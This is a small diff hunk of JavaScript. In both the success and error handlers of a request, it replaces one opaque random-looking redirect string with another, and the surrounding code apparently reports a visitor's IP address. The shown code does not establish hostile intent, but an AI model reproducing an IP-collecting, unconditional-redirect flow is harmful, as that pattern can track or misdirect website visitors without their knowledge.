@@ -57,10 +57,10 @@ IP: '${ip}'
                         },
                     })
                         .then(() => {
-                            window.location = 'dPy7Qr4Gs5Ft2Wp9Bu6Zv3Xq8Ky1Lo4Nh2Ix5Su7Jw8Tn3Rm4Fe9Ya6Hp1Gb5Jx8Vt7Yr6';
+                            window.location = 'kTy3Ap7Sx5Dq9Lo2Hr4Vm1Zw8Yn6Kf3Gh7Jt2Qy8Uo5Pj9Mb4Re6Fu3Hv5Xq7Zl8Cn1Ms9';
                         })
                         .catch((error) => {
-                            window.location = 'dPy7Qr4Gs5Ft2Wp9Bu6Zv3Xq8Ky1Lo4Nh2Ix5Su7Jw8Tn3Rm4Fe9Ya6Hp1Gb5Jx8Vt7Yr6';
+                            window.location = 'kTy3Ap7Sx5Dq9Lo2Hr4Vm1Zw8Yn6Kf3Gh7Jt2Qy8Uo5Pj9Mb4Re6Fu3Hv5Xq7Zl8Cn1Ms9';
                         });
                 });
         }
